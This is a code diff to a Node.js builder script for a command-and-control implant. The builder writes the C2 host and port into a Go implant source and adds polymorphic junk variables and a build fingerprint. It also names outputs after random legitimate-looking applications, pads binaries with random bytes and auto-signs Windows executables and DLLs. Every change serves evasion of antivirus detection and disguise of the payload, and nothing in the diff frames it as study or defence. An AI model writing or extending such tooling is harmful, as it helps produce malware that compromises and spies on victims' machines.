@@ -6,6 +6,7 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 const { spawn } = require('child_process');
+const { signPeFile, getSigningStatus } = require('./signing');
 
 const ROOT = path.join(__dirname, '..');
 const SOURCE = path.join(ROOT, 'lastfinalversion2.go');
@@ -153,6 +154,20 @@ function findMingwBin() {
   return extras[0] || null;
 }
 
+function defaultOutputBase(platform, tag = '') {
+  const suffix = crypto.randomBytes(3).toString('hex');
+  const extra = tag ? `_${tag}` : '';
+  if (platform === 'windows') {
+    const pick = APP_NAMES_WIN[crypto.randomBytes(1)[0] % APP_NAMES_WIN.length];
+    return `${pick.replace(/\.exe$/i, '')}${extra}_${suffix}`;
+  }
+  if (platform === 'linux') {
+    const pick = APP_NAMES_LINUX[crypto.randomBytes(1)[0] % APP_NAMES_LINUX.length];
+    return `${pick}${extra}_${suffix}`;
+  }
+  return `agent_${platform}_${suffix}`;
+}
+
 function run(cmd, args, opts = {}) {
   return new Promise((resolve, reject) => {
     const child = spawn(cmd, args, {
@@ -173,7 +188,7 @@ function run(cmd, args, opts = {}) {
   });
 }
 
-function mutateSource(src, { xorKey, shiftValue, host, port, stamp, platform }) {
+function mutateSource(src, { xorKey, shiftValue, host, port, stamp, platform, buildid }) {
   let out = src;
 
   // xorKey const
@@ -217,12 +232,18 @@ function mutateSource(src, { xorKey, shiftValue, host, port, stamp, platform }) 
   );
 
   // Inject polymorphic stamp AFTER imports (Go: package → import → decls)
+  const noise = Array.from(crypto.randomBytes(48));
   const junkVar = `
 // auto-generated polymorphic stamp — unique per build
 var (
 	polyStamp_${stamp.slice(0, 8)} = "${stamp}"
-	polyNoise_${stamp.slice(8, 16)} = []byte{${Array.from(crypto.randomBytes(32)).join(', ')}}
+	polyNoise_${stamp.slice(8, 16)} = []byte{${noise.join(', ')}}
+	PolyBuildId                                               = "${buildid}"
 )
+
+func polyBuildFingerprint() byte {
+	return polyNoise_${stamp.slice(8, 16)}[0] ^ polyStamp_${stamp.slice(0, 8)}[0] ^ PolyBuildId[0]
+}
 `;
   const m = out.match(/\nimport\s*\([\s\S]*?\n\)/);
   if (m && m.index != null) {
@@ -236,6 +257,11 @@ var (
     );
   }
 
+  out = out.replace(
+    /func runImplantMain\(dllMode bool\) \{/,
+    'func runImplantMain(dllMode bool) {\n\t_ = polyBuildFingerprint()'
+  );
+
   return out;
 }
 
@@ -245,11 +271,24 @@ async function generateBuild(options = {}) {
     throw new Error('platform must be windows or linux');
   }
 
+  const variant = String(options.variant || 'implant').toLowerCase();
+  if (platform === 'windows' && variant === 'dcom') {
+    const { generateDcomGoBuild } = require('./dcom_go');
+    return generateDcomGoBuild(options);
+  }
+
   const arch = String(options.arch || 'amd64').toLowerCase();
   const host = String(options.host || process.env.BUILD_C2_HOST || '127.0.0.1').trim();
   const port = Number(options.port || process.env.BUILD_C2_PORT || process.env.TCP_PORT || 2026);
   if (!host) throw new Error('host is required');
   if (!port || port < 1 || port > 65535) throw new Error('invalid port');
+
+  // Windows PE: always sign after build (dashboard does not require a toggle)
+  const signOpts = {
+    enabled: platform === 'windows' && options.signCode !== false,
+    subject: options.signSubject ? String(options.signSubject).trim() : undefined,
+    autoLab: options.signAuto !== false,
+  };
 
   if (!fs.existsSync(SOURCE)) {
     throw new Error('lastfinalversion2.go not found');
@@ -265,7 +304,7 @@ async function generateBuild(options = {}) {
   fs.mkdirSync(workDir, { recursive: true });
 
   const raw = fs.readFileSync(SOURCE, 'utf8');
-  const mutated = mutateSource(raw, { xorKey, shiftValue, host, port, stamp, platform });
+  const mutated = mutateSource(raw, { xorKey, shiftValue, host, port, stamp, platform, buildid });
   const goFile = path.join(workDir, 'main.go');
   fs.writeFileSync(goFile, mutated, 'utf8');
 
@@ -357,6 +396,7 @@ async function generateBuild(options = {}) {
     fs.copyFileSync(dllSrc, outPath);
     const pad = crypto.randomBytes(128 + (crypto.randomBytes(1)[0] % 512));
     fs.appendFileSync(outPath, pad);
+    const signResult = await signPeFile(outPath, signOpts);
     const stat = fs.statSync(outPath);
     const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');
     const meta = {
@@ -374,6 +414,9 @@ async function generateBuild(options = {}) {
       tool: 'go-cshared',
       format: 'dll',
       injectDllPacked: true,
+      authenticodeSigned: !!signResult.signed,
+      signPublisher: signResult.publisher,
+      signNote: signResult.signed ? undefined : (signResult.reason || undefined),
       createdAt: new Date().toISOString(),
     };
     fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
@@ -384,13 +427,13 @@ async function generateBuild(options = {}) {
   }
 
   const ext = platform === 'windows' ? '.exe' : '';
-  const baseName = (options.outputName || `implant_${platform}_${arch}`).replace(/[<>:"/\\|?*\s]/g, '_');
+  const baseName = (options.outputName || defaultOutputBase(platform)).replace(/[<>:"/\\|?*\s]/g, '_');
   const outName = baseName.endsWith(ext) || !ext ? `${baseName}${ext || ''}` : `${baseName}${ext}`;
   const outPath = path.join(workDir, outName);
 
   const ldflags = platform === 'windows'
-    ? `-s -w -H=windowsgui -X main.BuildMode=exe -buildid=${buildid}`
-    : `-s -w -buildid=${buildid}`;
+    ? `-s -w -H=windowsgui -X main.BuildMode=exe -X main.PolyBuildId=${buildid} -buildid=${buildid}`
+    : `-s -w -X main.PolyBuildId=${buildid} -buildid=${buildid}`;
 
   const env = {
     ...process.env,
@@ -442,6 +485,11 @@ async function generateBuild(options = {}) {
   const pad = crypto.randomBytes(256 + (crypto.randomBytes(1)[0] % 3840));
   fs.appendFileSync(outPath, pad);
 
+  let signResult = { signed: false };
+  if (platform === 'windows') {
+    signResult = await signPeFile(outPath, signOpts);
+  }
+
   const stat = fs.statSync(outPath);
   const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');
 
@@ -460,6 +508,9 @@ async function generateBuild(options = {}) {
     tool: path.basename(String(tool)),
     format: 'exe',
     injectDllPacked,
+    authenticodeSigned: !!signResult.signed,
+    signPublisher: signResult.publisher,
+    signNote: signResult.signed ? undefined : (signResult.reason || undefined),
     createdAt: new Date().toISOString(),
   };
   fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
@@ -523,5 +574,14 @@ module.exports = {
   listBuilds,
   getBuildPath,
   deleteBuild,
+  getSigningStatus,
   BUILDS_DIR,
+  randomId,
+  randomKey,
+  obfuscateString,
+  run,
+  which,
+  readManifest,
+  writeManifest,
+  defaultOutputBase,
 };
